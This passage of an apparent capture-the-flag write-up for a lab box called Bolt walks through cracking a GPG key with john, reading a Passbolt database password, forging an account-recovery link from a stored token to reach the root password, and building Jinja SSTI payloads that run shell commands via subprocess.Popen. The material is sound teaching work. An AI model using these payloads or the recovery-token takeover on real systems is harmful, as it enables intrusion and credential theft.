cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
...[snip]...

```

### Crack Key

[This page](https://miloserdov.org/?p=5426#13) has a section on cracking a GPG key using `john`, as it isn’t in `hashcat` at this time. I’ll use `gpg2john` to create a hash, and then feed it to `john`:

```

oxdf@hacky$ gpg2john eddie.key > eddie.key.john

File eddie.key

```

Now crack it with `john`:

```

oxdf@hacky$ john eddie.key.john --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
merrychristmas   (Eddie Johnson)
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

The password is merrychristmas.

### Access passbolt

On visiting `https://passbolt.bolt.htb` and entering `eddie@bolt.htb`, it returns a different page:

![image-20210908203440001](https://0xdfimages.gitlab.io/img/image-20210908203440001.png)

My first thought is to check the `/var/mail/eddie` file, but there’s no new email there.

Still, I can reconstruct the link that would have been send with database access. The code in `/etc/passbolt/passbolt.php` was:

```

    // Database configuration.                                                     
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306', 
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],

```

So I can connect with:

```

eddie@bolt:~$ mysql -u passbolt -p'rT2;jW7<eY8!dX8}pQ8%' passboltdb
...[snip]...
mysql> 

```

There are a handful of tables:

```

mysql> show tables;
+-----------------------+
| Tables_in_passboltdb  |
+-----------------------+
| account_settings      |
| action_logs           |
| actions               |
| authentication_tokens |
| comments              |
| email_queue           |
| entities_history      |
| favorites             |
| file_storage          |
| gpgkeys               |
| groups                |
| groups_users          |
| organization_settings |
| permissions           |
| permissions_history   |
| phinxlog              |
| profiles              |
| resource_types        |
| resources             |
| roles                 |
| secret_accesses       |
| secrets               |
| secrets_history       |
| user_agents           |
| users                 |
+-----------------------+
25 rows in set (0.00 sec)

```

`email_queue` jumps out as interesting based on my current goal:

```

mysql> describe email_queue;
+---------------+--------------+------+-----+---------+----------------+
| Field         | Type         | Null | Key | Default | Extra          |
+---------------+--------------+------+-----+---------+----------------+
| id            | int          | NO   | PRI | NULL    | auto_increment |
| email         | varchar(129) | NO   |     | NULL    |                |
| from_name     | varchar(255) | YES  |     | NULL    |                |
| from_email    | varchar(255) | YES  |     | NULL    |                |
| subject       | varchar(255) | NO   |     | NULL    |                |
| config        | varchar(30)  | NO   |     | NULL    |                |
| template      | varchar(100) | NO   |     | NULL    |                |
| layout        | varchar(50)  | NO   |     | NULL    |                |
| theme         | varchar(50)  | NO   |     | NULL    |                |
| format        | varchar(5)   | NO   |     | NULL    |                |
| template_vars | longtext     | NO   |     | NULL    |                |
| headers       | text         | YES  |     | NULL    |                |
| sent          | tinyint(1)   | NO   |     | 0       |                |
| locked        | tinyint(1)   | NO   |     | 0       |                |
| send_tries    | int          | NO   |     | 0       |                |
| send_at       | datetime     | YES  |     | NULL    |                |
| created       | datetime     | NO   |     | NULL    |                |
| modified      | datetime     | YES  |     | NULL    |                |
| attachments   | text         | YES  |     | NULL    |                |
| error         | text         | YES  |     | NULL    |                |
+---------------+--------------+------+-----+---------+----------------+
20 rows in set (0.00 sec)

```

There are five rows in it:

```

mysql> select id,email,subject from email_queue;
+----+----------------+------------------------------------------------+
| id | email          | subject                                        |
+----+----------------+------------------------------------------------+
|  1 | clark@bolt.htb | Clark just activated their account on passbolt |
|  2 | eddie@bolt.htb | Welcome to passbolt, Eddie!                    |
|  3 | clark@bolt.htb | Eddie just activated their account on passbolt |
|  4 | eddie@bolt.htb | You added the password passbolt.bolt.htb       |
|  6 | eddie@bolt.htb | Your account recovery, Eddie!                  |
+----+----------------+------------------------------------------------+
5 rows in set (0.00 sec)

```

Not much data in here…The only field that has anything interesting is `template_vars`, which is a PHP serialized object:

```

| a:2:{s:4:"body";a:3:{s:4:"user";O:21:"App\Model\Entity\User":11:{s:11:" * _virtual";a:1:{i:0;s:14:"last_logged_in";}s:14:" * _accessible";a:6:{s:2:"id";b:0;s:8:"username";b:0;s:6:"active";b:0;s:7:"deleted";b:0;s:7:"role_id";b:0;s:7:"profile";b:0;}s:14:" * _properties";a:9:{s:2:"id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:7:"role_id";s:36:"1cfcd300-0664-407e-85e6-c11664a7d86c";s:8:"username";s:14:"eddie@bolt.htb";s:6:"active";b:1;s:7:"deleted";b:0;s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:42:50.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:55:06.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"profile";O:24:"App\Model\Entity\Profile":11:{s:14:" * _accessible";a:4:{s:2:"id";b:0;s:7:"user_id";b:0;s:10:"first_name";b:0;s:9:"last_name";b:0;}s:14:" * _properties";a:7:{s:2:"id";s:36:"13d7b7c4-917e-48ee-9560-f022c89b2895";s:7:"user_id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:10:"first_name";s:5:"Eddie";s:9:"last_name";s:7:"Johnson";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:42:50.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:55:06.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:6:"avatar";O:23:"App\Model\Entity\Avatar":16:{s:11:" * _virtual";a:1:{i:0;s:3:"url";}s:14:" * _accessible";a:7:{s:8:"filename";b:1;s:5:"model";b:1;s:11:"foreign_key";b:1;s:4:"file";b:1;s:11:"old_file_id";b:1;s:4:"hash";b:0;s:1:"*";b:1;}s:20:" * _pathBuilderClass";N;s:22:" * _pathBuilderOptions";a:0:{}s:14:" * _properties";a:13:{s:2:"id";s:36:"fe5ffd32-1d48-428d-b27a-c4e0650902af";s:7:"user_id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:11:"foreign_key";s:36:"13d7b7c4-917e-48ee-9560-f022c89b2895";s:5:"model";s:6:"Avatar";s:8:"filename";s:36:"bdc648c5785c89e70131b6659b58a841.jpg";s:8:"filesize";i:42238;s:9:"mime_type";s:10:"image/jpeg";s:9:"extension";s:3:"jpg";s:4:"hash";s:40:"c6ffb798865c74a47694da8fb31bc84bba74f5ed";s:4:"path";s:85:"Avatar/17/d4/9a/fe5ffd321d48428db27ac4e0650902af/fe5ffd321d48428db27ac4e0650902af.jpg";s:7:"adapter";s:5:"Local";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:55:06.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:55:06.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:13:" * _className";N;s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:7:"Avatars";s:16:" * _eventManager";N;s:14:" * _eventClass";s:16:"Cake\Event\Event";s:15:" * _pathBuilder";N;}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:13:" * _className";N;s:9:" * _dirty";a:1:{s:6:"avatar";b:1;}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:8:"Profiles";}s:4:"role";O:21:"App\Model\Entity\Role":11:{s:14:" * _accessible";a:2:{s:1:"*";b:1;s:2:"id";b:0;}s:14:" * _p
roperties";a:5:{s:2:"id";s:36:"1cfcd300-0664-407e-85e6-c11664a7d86c";s:4:"name";s:4:"user";s:11:"description";s:14:"Logged in user";s:7:"created";O:20:"Cake\I18n\Froze
nTime":3:{s:4:"date";s:26:"2012-07-04 13:39:25.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26
:"2012-07-04 13:39:25.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:13:" * _
className";N;s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:5:"Roles";}}s:12:" * _original";a:0:{}
s:10:" * _hidden";a:0:{}s:13:" * _className";N;s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:5:"U
sers";}s:5:"token";O:36:"App\Model\Entity\AuthenticationToken":11:{s:14:" * _accessible";a:6:{s:2:"id";b:0;s:7:"user_id";b:1;s:5:"token";b:1;s:6:"active";b:1;s:4:"type
";b:1;s:4:"data";b:0;}s:14:" * _properties";a:7:{s:7:"user_id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:5:"token";s:36:"b30eb3c3-9581-4486-b0c8-65af9238f693";s:6:
"active";b:1;s:4:"type";s:7:"recover";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-09-09 00:35:32.380033";s:13:"timezone_type";i:3;s:8:"timezone"
;s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-09-09 00:35:32.380058";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:2:"id";s:36
:"d5f86f6c-dfa5-4daa-b75d-4cb2f98b3e88";}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:13:" * _className";N;s:9:" * _dirty";a:0:{}s:7:" 
* _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:20:"AuthenticationTokens";}s:11:"fullBaseUrl";s:25:"https://passbolt.bolt.htb";
}s:5:"title";s:29:"Your account recovery, Eddie!";} |

```

Going back to Google, [this post](https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394) shows how to make the recovery link:

![image-20210908204503183](https://0xdfimages.gitlab.io/img/image-20210908204503183.png)

I’ll get eddie’s user ID:

```

mysql> select id from users where username = 'eddie@bolt.htb';
+--------------------------------------+
| id                                   |
+--------------------------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc |
+--------------------------------------+
1 row in set (0.00 sec)

```

And the token:

```

mysql> select token from authentication_tokens where user_id = '4e184ee6-e436-47fb-91c9-dccb57f250bc' and type = 'recover';
+--------------------------------------+
| token                                |
+--------------------------------------+
| c0f05c38-2ae0-429d-9ee4-8929d7634ff1 |
+--------------------------------------+
1 row in set (0.00 sec)

```

That gives me `https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/c0f05c38-2ae0-429d-9ee4-8929d7634ff1`. On visiting, it prompts to install the plugin:

![image-20210908204841768](https://0xdfimages.gitlab.io/img/image-20210908204841768.png)

I’ll download and install the extension, and then click the “Refresh to detect extension” link. It offers a new form:

![image-20210908204931066](https://0xdfimages.gitlab.io/img/image-20210908204931066.png)

I’ll give it the key from the config and hit “Next”. It now needs the password for the key:

![image-20210908205008102](https://0xdfimages.gitlab.io/img/image-20210908205008102.png)

On entering the password and clicking “Verify”, it leads to some setup:

![image-20210908205052345](https://0xdfimages.gitlab.io/img/image-20210908205052345.png)

On clicking next, I’m into the account:

![image-20210908205124837](https://0xdfimages.gitlab.io/img/image-20210908205124837.png)

The root password is there. Opening the item, selecting edit, and then clicking on the eye, it shows the password:

![image-20210908205308180](https://0xdfimages.gitlab.io/img/image-20210908205308180.png)

### su

With this password I can becoming root with `su`:

```

eddie@bolt:~$ su -
Password: 
root@bolt:~#

```

And read the flag:

```

root@bolt:~# cat root.txt
47062921************************

```

## Beyond Root

### Python SSTI Deep Dive

In [this video](https://www.youtube.com/watch?v=7o1J8vHdlYc), I’ll go for a deep dive into three different SSTI Python payloads and look at how they work:

### Trickier SSTI Payload

When I first solved, I started working with one of the SSTI payloads that took some calculation to figure out:

```

{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

```

It returns a 500 error when I try to click the confirm link. I’ll remove a bunch of it to just get the list of subclasses:

```

{{ ''.__class__.__mro__[1].__subclasses__() }}

```

Submitting that returns a long list in the email:

![image-20210908163747213](https://0xdfimages.gitlab.io/img/image-20210908163747213.png)

I’ll drop that into a file and view it with newlines replacing commas:

```

cat classes.txt | tr ',' '\n' | less

```

One interesting class is `<class 'subprocess.Popen'>`. That should allow me to run commands. I’ll need to know the position of this class in the array, so I can `grep` with line number (`-n`):

```

oxdf@hacky$ cat classes.txt | tr ',' '\n' | grep -n Popen
223: <class 'subprocess.Popen'>

```

As `grep` is numbered from one, this is actually 222 when numbered from zero.

To run with subprocess and get the results, I’ll need to call `subprocess.Popen("[cmd]", stdout=subprocess.PIPE).communicate()`. In this case, that’ll look like:

```

{{ ''.__class__.__mro__[1].__subclasses__()[222]('id', stdout=?).communicate() }}

```

I show a `?` in there where it’s not clear how to get `subprocess.PIPE`. PayloadsAllTheThings shows the answer with this example:

```

{{ ''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

```

The [Python source](https://github.com/python/cpython/blob/f235dd0784b92824565c4a4e72adc70fa3eab68f/Lib/subprocess.py#L259) also shows `subprocess.PIPE` is -1, so I can just use that value and not need to reference the object.

I’ll give this payload a try, submitting it as my name:

```

{{ ''.__class__.__mro__[1].__subclasses__()[222]('id', shell=True, stdout=-1).communicate() }}

```

On clicking the confirm link, I get the result:

![image-20210908165349973](https://0xdfimages.gitlab.io/img/image-20210908165349973.png)